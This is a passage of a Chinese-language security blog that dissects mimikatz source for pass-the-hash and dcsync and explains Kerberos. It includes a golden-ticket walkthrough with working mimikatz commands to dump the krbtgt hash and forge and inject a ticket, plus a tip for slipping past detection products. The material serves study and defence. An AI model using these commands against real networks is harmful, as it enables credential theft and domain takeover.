+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword">&#123;</span></div><div class="line"><span class="keyword">	</span>SIZE_T i<span class="comment">;</span></div><div class="line">	PKULL_M_PATCH_GENERIC current = NULL<span class="comment">;</span></div><div class="line"></div><div class="line">	for(i = <span class="number">0</span><span class="comment">; i &lt; cbGenerics; i++)</span></div><div class="line">	&#123;</div><div class="line">		if(generics[i].MinBuildNumber &lt;= <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword">	</span>		current = &amp;generics[i]<span class="comment">;</span></div><div class="line">		else <span class="keyword">break;</span></div><div class="line"><span class="keyword">	</span>&#125;</div><div class="line">	return current<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后调用kull_m_memory_search搜索指定特征码的地址</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for(<span class="name">CurrentPtr</span> = (<span class="name">PBYTE</span>) Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.address<span class="comment">; !status &amp;&amp; (CurrentPtr + Length &lt;= limite); CurrentPtr++)</span></div><div class="line">	status = RtlEqualMemory(<span class="name">Pattern-&gt;address</span>, CurrentPtr, Length)<span class="comment">;</span></div><div class="line">CurrentPtr--<span class="comment">;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>调用lsassLocalHelper-&gt;AcquireKeys()函数，本质是调用kuhl_m_sekurlsa_nt6_acquireKeys()函数。其本质和kuhl_m_sekurlsa_utils_search_generic()函数一样，都是先调用kull_m_patch_getGenericFromBuild选择合适的特征码，然后搜索。其目的是为了寻找用于加密凭证的秘钥，因为凭证在内存中加密存储的。其实windows并不是直接比较里面的NTLM散列，而是比较经过加密之后的散列的密文。然后调用利用寻找到的秘钥调用BCryptGenerateSymmetricKey生成秘钥。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = &#123; <span class="comment">// InitializationVector, h3DesKey, hAesKey</span></div><div class="line">	&#123;KULL_M_WIN_BUILD_VISTA,	&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">63</span>, <span class="number">-69</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_7,		&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">59</span>, <span class="number">-61</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_8,		&#123;sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">62</span>, <span class="number">-70</span>, <span class="number">23</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1507,	&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">61</span>, <span class="number">-73</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">	&#123;KULL_M_WIN_BUILD_10_1809,	&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">67</span>, <span class="number">-89</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>  <img src="http://hacky.wang/blog/20220217/cIDEWiDFgUuh.png?imageslim" alt="mark"></p>
+</li>
+<li><p>调用kuhl_m_sekurlsa_enum寻找登录凭证，最终调用kuhl_m_sekurlsa_enum_callback_msv_pth函数将加密之后的凭证写入Lsass.exe进程的指定的LogonSessionList数组中。首先比较是否是指定的LogonId。然后调用kuhl_m_sekurlsa_msv_enum_cred()函数</p>
+<figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)</div><div class="line">&#123;</div><div class="line">	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;</div><div class="line">	MSV1_0_PTH_DATA_CRED credData = &#123;pData, pthData&#125;;</div><div class="line">	<span class="keyword">if</span>(SecEqualLuid(pData-&gt;LogonId, pthData-&gt;LogonId))</div><div class="line">	&#123;</div><div class="line">		kuhl_m_sekurlsa_msv_enum_cred(pData-&gt;cLsass, pData-&gt;pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_pth, &amp;credData);</div><div class="line">		<span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>最终调用kuhl_m_sekurlsa_msv_enum_cred_callback_pth，在kuhl_m_sekurlsa_msv_enum_cred_callback_pth函数中，首先会调用kuhl_m_sekurlsa_nt6_LsaEncryptMemory函数加密NTLM散列。其加密逻辑是如果加密的凭证能被8整除，则使用AES，否则使用3DES。</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(*<span class="function"><span class="title">pthDataCred</span>-&gt;</span><span class="function"><span class="title">pSecData</span>-&gt;</span><span class="function"><span class="title">lsassLocalHelper</span>-&gt;</span><span class="function"><span class="title">pLsaProtectMemory</span>)(msvCredentials, pCredentials-&gt;</span>Credentials.Length);</div><div class="line">VOID WINAPI kuhl_m_sekurlsa_nt6_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize)</div><div class="line">&#123;</div><div class="line">	kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);</div><div class="line">&#125;</div><div class="line"><span class="comment">//////加密逻辑</span></div><div class="line"><span class="keyword">if</span>(cbMemory % <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line">	hKey = &amp;kAes.hKey;</div><div class="line">	cbIV = sizeof(InitializationVector);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">	hKey = &amp;k3Des.hKey;</div><div class="line">	cbIV = sizeof(InitializationVector) / <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">__try</div><div class="line">&#123;</div><div class="line">	status = cryptFunc(*hKey, pMemory, cbMemory, <span class="number">0</span>, LocalInitializationVector, cbIV, pMemory, cbMemory, &amp;cbResult, <span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后调用kull_m_memory_copy函数中的WriteProcessMemory写入Lsass.exe进程空间。最后Resume线程。完事PtH。</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line">	<span class="function"><span class="title">status</span> = WriteProcessMemory(Destination-&gt;</span><span class="function"><span class="title">hMemory</span>-&gt;</span><span class="function"><span class="title">pHandleProcess</span>-&gt;</span><span class="function"><span class="title">hProcess</span>, Destination-&gt;</span><span class="function"><span class="title">address</span>, Source-&gt;</span>address, Length, NULL);</div><div class="line">	break;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="NTLM-凭证生成"><a href="#NTLM-凭证生成" class="headerlink" title="NTLM 凭证生成"></a>NTLM 凭证生成</h2><ul>
+<li><code>msv1_0!LsaApLogonUserEx2</code>—&gt;<code>lsasrv!LsapCreateLsaLogonSession</code>—-&gt;<code>msv1_0!SpAcceptCredentials</code></li>
+</ul>
+<h2 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h2><ul>
+<li><p>Kerberos协议的组成角色：</p>
+<ul>
+<li>客户端：发送请求的一方</li>
+<li>服务端：接收请求的一方</li>
+<li>秘钥分发中心(Key Distribution Center KDC),KDC分为两部分：<ul>
+<li>AS(Authentication Server)：用于认证客服端，以及发放后续客户端用于访问TGS(Ticket Granting Server)的TGT(凭据授予票据Ticket Granting Ticket)</li>
+<li>TGS(Ticket Granting Server):同于发放认证过程和客户端访问服务端的票据</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Kerberos协议通过引入同时认识客户端(A)和服务端(B)的秘钥分发中心(C)实现身份认证。简化的流程如下：</p>
+<ul>
+<li>第一步：客户端向KDC请求获取访问服务端的服务授予票据</li>
+<li>第二歩：客户端拿着服务授予票据访问服务端</li>
+</ul>
+</li>
+<li><p>上述步骤存在的问题：</p>
+<ul>
+<li>1.KDC如何判断客户端的安全性(真实性)？</li>
+<li>2.服务端如何判断客户端的服务授予票据的真实性？</li>
+</ul>
+</li>
+<li><p>Kerberos认证协议的前提：</p>
+<ul>
+<li>Kerberos存在一个数据库，运维人员会添加可以使用认证服务的人员和网络服务。相当于一个白名单。</li>
+<li>当用户被添加到数据库，会根据当前的密码生成一把秘钥存储在数据库中(很重要)。并且保存用户的基本信息，以供认证。</li>
+<li>只要两两通讯就会进行认证。</li>
+</ul>
+</li>
+<li><p>两个个人理解的概念：机器秘钥(与机器密码强相关的秘钥)，会话秘钥(CT_SK,CS_SK)本次会话中使用的秘钥，会消失。</p>
+</li>
+</ul>
+<h3 id="Kerberos协议第1次通讯"><a href="#Kerberos协议第1次通讯" class="headerlink" title="Kerberos协议第1次通讯"></a>Kerberos协议第1次通讯</h3><ul>
+<li>客户端行为：<ul>
+<li>1.客户端明文向KDC发送请求，该次请求中携带了自己的用户名，主机IP，和当前时间戳</li>
+</ul>
+</li>
+<li><p>KDC行为：</p>
+<ul>
+<li>1.KDC(其中的AS认证服务器)在数据库中比较，是否存在该用户名的用户，<strong>但是不会判断身份的可靠性</strong></li>
+<li>2.如果没有该用户名，认证失败。如果存在，则发送下面两部分数据给客户端<ul>
+<li>TGT(Ticket Granting Ticket即票据授予票据,TGT客户端使用TGT去KDC获取服务授予票据):TGT包含客户端的Name,Ip,时间戳，TGS_Name，TGT的有效时间，以及<strong>一把客户端和TGS通讯的CT_SK(Client And TGS Session Key CT_SK)</strong>。TGT使用TGS的秘钥进行加密(客户端无法解密)，并且秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li>
+<li>将CT_SK,TGS_Name,TGT的有效时间，当前时间戳等数据使用<strong>客户端的秘钥(保存在数据库中)</strong>加密的数据。该秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>总结：KDC总是会传递两部分数据，一部分是客户端能解密的数据(KDC存在客户端秘钥)，第二部分是客户端不能解密的数据(使用TGS秘钥)，<strong>重点是将使用客户端秘钥加密过的CT_SK传递给客户端，避免CT_SK中间被窃取，因为非法的客户端不存在真实的客户端秘钥！这样就实现了CT_SK的传递</strong>。</p>
+</li>
+<li>备注：<strong>凭据信息(TGT,ST)是由和机器密码强相关的秘钥进行加密，主机秘钥在网络中不传递。由来校验加密数据的端点信息和凭据中的端点信息。第一次通讯主要有两个目的，第一，验证客户端是否存在，第二，传递CT_KS会话秘钥。</strong></li>
+</ul>
+<h3 id="Kerberos协议第2次通讯"><a href="#Kerberos协议第2次通讯" class="headerlink" title="Kerberos协议第2次通讯"></a>Kerberos协议第2次通讯</h3><ul>
+<li>客户端行为：<ul>
+<li>1.客户端接收上述KDC发送的TGT和加密数据，利用自己的秘钥解密加密数据，<strong>并获取CT_SK会话秘钥</strong>。如果获取的时间戳和自己发送的时间戳差值大于5mins，则认证结束。否则客户端向TGS发送请求。</li>
+<li>2.利用接收到的CT_SK(Session Key)加密自身的客户端信息，包括客户端名，ip，时间戳。</li>
+<li>3.客户端向KDC发送要访问的服务端的明文信息。</li>
+<li>4.客户端向KDC发送没改变的TGT。</li>
+</ul>
+</li>
+<li><p>TGS行为：</p>
+<ul>
+<li>1.TGS验证客户端明文发送的服务端信息,如果不存在，则认证结束。</li>
+<li>2.TGS利用自身的秘钥解密TGT，得到时间戳和CT_SK,如果时间超过5mins，则认证结束。</li>
+<li>3.使用CT_SK解密客户端发送的客户端信息，比较这个客户端信息和TGT里面的客户端信息进行比对。如果不同则，认证结束。</li>
+<li>4.KDC发送响应内容给客户端：<ul>
+<li>服务端秘钥加密的Ticket(ST),内容包括：客户端信息，Serivce IP，ST的有效时间，时间戳，以及客户端服务端通信的CS_SK</li>
+<li>使用CT_SK加密的内容，其中包括CS_SK，时间戳,ST的有效期。此时客户端已经使用自身的秘钥解密的第一次通讯接收的第二部分数据，获取了CT_SK，<strong>并进行了缓存</strong>。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>总结：本次通讯，有三个目的，第一：客户端会发送服务端信息以让TGS确认<strong>是否存在服务端</strong>，以及CT_SK加密之后的客户端信息和TGT，以让TGS比较两个数据中保存的<strong>客户端信息是否相同</strong>。并<strong>传递ST和包含CS_SK会话秘钥</strong>的加密数据。</p>
+</li>
+<li>备注：<strong>每一次通讯，KDC都会把下一次通讯所需要的会话秘钥传递给客户端。并且客户端每次都会发送两次包含自身数据的报文给校验者从而校验自身，其中TGT和ST的机器秘钥(TGS和服务端机器秘钥)都不经过传递，保证安全性。</strong></li>
+</ul>
+<h3 id="Kerberos协议第3次通讯"><a href="#Kerberos协议第3次通讯" class="headerlink" title="Kerberos协议第3次通讯"></a>Kerberos协议第3次通讯</h3><ul>
+<li>客户端行为<ul>
+<li>1.客户端收到KDC的响应，解密有CT_SK加密的第二部分数据，确认无误后，<strong>并获取CS_SK会话秘钥</strong>继续。</li>
+<li>2.客户端使用CS_SK将自己主机信息和时间戳加密发送给服务端</li>
+<li>3.客户端将第二次通讯获得的服务端凭证ST发送给服务端</li>
+</ul>
+</li>
+<li><p>服务端行为</p>
+<ul>
+<li>1.服务端接收到客户端发来的两部分数据后，服务端使用服务端秘钥解密ST，校验时间戳。</li>
+<li>2.使用CS_SK解密客户端发来的第一部分数据，得到TGS认证过的客户端信息。然后对比这部分数据的客户端信息和经过服务端秘钥加密的ST的客户端信息，判断客户端的合理性。</li>
+<li>3.服务端返回的CT_SK加密的数据，以是的客户端确认服务端身份。就此，Kerberos认证完成。</li>
+</ul>
+</li>
+<li><p>总结：第三次通讯，服务端利用自身的秘钥解密ST，获取其中的客户端信息，然后<strong>比较客户端发来的客户端信息</strong>。从而客户端的合理性。</p>
+</li>
+</ul>
+<p>Ref:<a href="https://seevae.github.io/2020/09/12/详解kerberos认证流程/" target="_blank" rel="external">详解kerberos认证流程</a></p>
+<h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><ul>
+<li>Ptt主要在域内进行横向移动的技术。</li>
+</ul>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><ul>
+<li>特点：有效时间长(默认是十年)，不会因为密码的修改导致票据的失效，用户名可以是任意的虚拟的。</li>
+<li><p>制作黄金票据的前提：</p>
+<ul>
+<li>域名称</li>
+<li>SID</li>
+<li>域的kbrtgt的Hash(要求短暂的拿到域控服务器的控制权)</li>
+<li>任意用户名</li>
+</ul>
+</li>
+<li><p>在域控服务器中(备注，也可以不登录域控即可获取<a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">https://www.freebuf.com/articles/network/286137.html</a>)，使用<code>mimikatz.exe &quot;lsadump::dcsync /domain:corp.hacky.ren /user:krbtgt&quot; &gt;&gt; golden.txt</code>,可以得到SID以及kbrtgt的Hash，以及域名称。<br>  <img src="http://hacky.wang/blog/20220224/v1o2BzRHGqRi.png?imageslim" alt="mark"></p>
+</li>
+<li><p>在非域控主机中，使用<code>mimikatz.exe &quot;kerberos::golden /admin:hacky /domain:corp.hacky.ren /sid:S-1-5-21-442036050-123597327-3835497791 kbrgtg:ac9a6f3e6ea0f74274725c39179f44a1 /ptt&quot;</code>生成黄金票据，并将其导入内存。</p>
+<ul>
+<li>/admin参数：表示任意伪造的用户名(最好改为受控的主机名，因为部分安全产品是通过检索登录的域账户是否存在而检测PtT)</li>
+<li>/sid:sid数值，取最后一个“-”之前的内容</li>
+<li>/ptt:直接导入内存，这样就不需要使用”kerberos::ptt导入了”<br><img src="http://hacky.wang/blog/20220224/IlxDKwvIESBp.png?imageslim" alt="mark"></li>
+</ul>
+</li>
+<li><p>使用<code>klist</code>或者<code>kerberos::list</code>查看伪造的金票是否被导入。<br>  <img src="http://hacky.wang/blog/20220224/qYBfHpfYehbB.png?imageslim" alt="mark"></p>
+</li>
+<li><p>修改域控服务器密码为abcd.123，然后在远程登录域控，测试金票是否有效。<br>  <img src="http://hacky.wang/blog/20220224/cgK4nT1YidQt.png?imageslim" alt="mark"></p>
+</li>
+<li><p>Ref:</p>
+<ul>
+<li><a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">内网渗透测试：DCSync 攻击技术的利用</a></li>
+<li><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/" target="_blank" rel="external">浅析黄金票据与白银票据</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="lsadump-dcsync-源码分析"><a href="#lsadump-dcsync-源码分析" class="headerlink" title="lsadump::dcsync 源码分析"></a>lsadump::dcsync 源码分析</h3><ul>
+<li><p>原理：不同的域控制器(DC)会进行数据同步复制，mimikatz通过模拟一个域控制器，通过GetNCChanges函数向真实的域控制器发送数据同步复制请求，获取控制器指定的用户的口令Hash。dcsync的主要特点是不需要登录域控服务器而获取用户口令HASH。需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据。</p>
+</li>
+<li><p>lsadump::dcsync命令源码位于<code>\mimikatz\modules\lsadump\kuhl_m_lsadump_dc.c</code>中的<code>NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])</code>函数中。</p>
+</li>
+<li><p>首先，通过<code>kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &amp;szTmpDc)</code>寻找域内的域控服务器，其本质会调用<code>DsGetDcName</code>API函数。</p>
+</li>
+<li><p>然后，通过<code>IDL_DRSGetNCChanges</code>函数，向真实域控服务器发送请求，以获取用户信息。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RtlZeroMemory(<span class="name">&amp;getChRep</span>, sizeof(<span class="name">DRS_MSG_GETCHGREPLY</span>))<span class="comment">;</span></div><div class="line">drsStatus = IDL_DRSGetNCChanges(<span class="name">hDrs</span>, <span class="number">8</span>, <span class="symbol">&amp;getChReq</span>, <span class="symbol">&amp;dwOutVersion</span>, <span class="symbol">&amp;getChRep</span>)<span class="comment">;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>几个重要的结构体</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY</span>:用于接收<span class="type">IDL_DRSGetNCChanges</span>传来的响应消息</div><div class="line">typedef union _DRS_MSG_GETCHGREPLY &#123;</div><div class="line">	<span class="type">DRS_MSG_GETCHGREPLY_V6</span> <span class="type">V6</span>;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY</span>;</div><div class="line">//////</div><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY_V6</span>表示<span class="type">DRS_MSG_GETCHGREPLY</span>的第六个版本</div><div class="line">typedef struct _DRS_MSG_GETCHGREPLY_V6 &#123;</div><div class="line">	<span class="type">UUID</span> uuidDsaObjSrc;</div><div class="line">	<span class="type">UUID</span> uuidInvocIdSrc;</div><div class="line">	<span class="type">DSNAME</span> *pNC;</div><div class="line">	<span class="type">USN_VECTOR</span> usnvecFrom;</div><div class="line">	<span class="type">USN_VECTOR</span> usnvecTo;</div><div class="line">	<span class="type">UPTODATE_VECTOR_V2_EXT</span> *pUpToDateVecSrc;</div><div class="line">	<span class="type">SCHEMA_PREFIX_TABLE</span> <span class="type">PrefixTableSrc</span>;</div><div class="line">	<span class="type">ULONG</span> ulExtendedRet;</div><div class="line">	<span class="type">ULONG</span> cNumObjects;</div><div class="line">	<span class="type">ULONG</span> cNumBytes;</div><div class="line">	<span class="type">REPLENTINFLIST</span> *pObjects;</div><div class="line">	<span class="type">BOOL</span> fMoreData;</div><div class="line">	<span class="type">ULONG</span> cNumNcSizeObjects;</div><div class="line">	<span class="type">ULONG</span> cNumNcSizeValues;</div><div class="line">	<span class="type">DWORD</span> cNumValues;</div><div class="line">	<span class="type">REPLVALINF_V1</span> *rgValues;</div><div class="line">	<span class="type">DWORD</span> dwDRSError;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY_V6</span>;</div><div class="line">/////////</div><div class="line">//<span class="type">PrefixTableSrc</span>定义了从<span class="type">OID</span>到<span class="type">ATTRTYP</span>值的映射表</div><div class="line">typedef struct _SCHEMA_PREFIX_TABLE &#123;</div><div class="line">	<span class="type">DWORD</span> <span class="type">PrefixCount</span>;   //<span class="type">PrefixTableEntry</span>的数量</div><div class="line">	<span class="type">PrefixTableEntry</span> *pPrefixEntry; //包含了<span class="type">PrefixTableEntry</span>的数组</div><div class="line">&#125; <span class="type">SCHEMA_PREFIX_TABLE</span>;</div><div class="line">////</div><div class="line">//<span class="type">REPLENTINFLIST</span>包含了给定对象(<span class="type">Object</span>)的一个或多个属性</div><div class="line"> typedef struct <span class="type">REPLENTINFLIST</span> &#123;</div><div class="line">   struct <span class="type">REPLENTINFLIST</span>* pNextEntInf;</div><div class="line">   <span class="type">ENTINF</span> <span class="type">Entinf</span>;</div><div class="line">   <span class="type">BOOL</span> fIsNCPrefix;</div><div class="line">   <span class="type">UUID</span>* pParentGuid;</div><div class="line">   <span class="type">PROPERTY_META_DATA_EXT_VECTOR</span>* pMetaDataExt;</div><div class="line"> &#125; <span class="type">REPLENTINFLIST</span>;</div><div class="line">/////</div><div class="line">//<span class="type">AttrBlock</span> 简单的理解为属性块</div></pre></td></tr></table></figure>
+</li>
+<li><p>kuhl_m_lsadump_dcsync_descrObject()函数解析/描述对象，其函数原型如下,其中第一个参数prefixTable和第二个参数attributes分别表示OID和ATTRTYP的映射表，AttrBlock表示一个属性块。其最终会返回一个<code>ATTRVALBLOCK</code>结构</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void kuhl_m_lsadump_dcsync_descrObject(<span class="keyword">SCHEMA_PREFIX_TABLE </span>*<span class="keyword">prefixTable, </span></div><div class="line">	ATTRBLOCK *attributes, </div><div class="line">	LPCWSTR szSrcDomain, </div><div class="line">	<span class="keyword">BOOL </span>someExport, </div><div class="line">	ATTRTYP *pSuppATT_IntId, </div><div class="line">	DWORD cSuppATT_IntId)</div></pre></td></tr></table></figure>
+</li>
+<li><p>kuhl_m_lsadump_dcsync_descrObject最终会调用kull_m_rpc_drsr_findMonoAttr用户获取指定OID对应的属性值，其中最最最重要的是<code>kull_m_rpc_drsr_findAttr</code>函数，其函数原型如下。其会调用<code>kull_m_rpc_drsr_MakeAttid</code>函数，通过传入的OID生成一个ATTRTYP结构。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttr(</div><div class="line">	SCHEMA_PREFIX_TABLE *prefixTable, </div><div class="line">	ATTRBLOCK *attributes, </div><div class="line">	LPCSTR szOid)</div></pre></td></tr></table></figure>
+</li>
+<li><p>kull_m_rpc_drsr_MakeAttid函数源码如下,很显然，kull_m_rpc_drsr_MakeAttid()首先会截取OID的最后一个数字，接着调用kull_m_rpc_drsr_MakeAttid_addPrefixToTable()取ndx。然后将取到的ndx左移16位，再或运算之后，得到ATTRTYP，这其实是一个ULONG类型。</p>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> kull_m_rpc_drsr_MakeAttid(SCHEMA_PREFIX_TABLE *prefixTable, LPCSTR szOid, ATTRTYP *att, <span class="built_in">BOOL</span> toAdd)</div><div class="line">&#123;</div><div class="line">	<span class="built_in">BOOL</span> status = <span class="literal">FALSE</span>;</div><div class="line">	DWORD lastValue, ndx;</div><div class="line">	PSTR lastValueString;</div><div class="line">	OssEncodedOID oidPrefix;</div><div class="line">	<span class="keyword">if</span>(lastValueString = strrchr(szOid, <span class="string">'.'</span>))</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(*(lastValueString + <span class="number">1</span>))</div><div class="line">		&#123;</div><div class="line">			lastValueString++;</div><div class="line">			lastValue = strtoul(lastValueString, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">			*att = (WORD) lastValue % <span class="number">0x4000</span>;</div><div class="line">			<span class="keyword">if</span>(*att &gt;= <span class="number">0x4000</span>)</div><div class="line">				*att += <span class="number">0x8000</span>;</div><div class="line">			<span class="keyword">if</span>(kull_m_asn1_DotVal2Eoid(szOid, &amp;oidPrefix))</div><div class="line">			&#123;</div><div class="line">				oidPrefix.length -= (lastValue &lt; <span class="number">0x80</span>) ? <span class="number">1</span> : <span class="number">2</span>;</div><div class="line">				<span class="keyword">if</span>(status = kull_m_rpc_drsr_MakeAttid_addPrefixToTable(prefixTable, &amp;oidPrefix, &amp;ndx, toAdd))</div><div class="line">				&#123;</div><div class="line">					*att |= ndx &lt;&lt; <span class="number">16</span>;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">else</span> PRINT_ERROR(L<span class="string">"kull_m_rpc_drsr_MakeAttid_addPrefixToTable\n"</span>);</div><div class="line">				kull_m_asn1_freeEnc(oidPrefix.value);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> status;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后通过kull_m_rpc_drsr_findAttrNoOID()遍历整个ATTRBLOCK,ATTRBLOCK结构如下，包含了一个Count表示，ATTR列表的个数，ATTR为一个列表。</p>
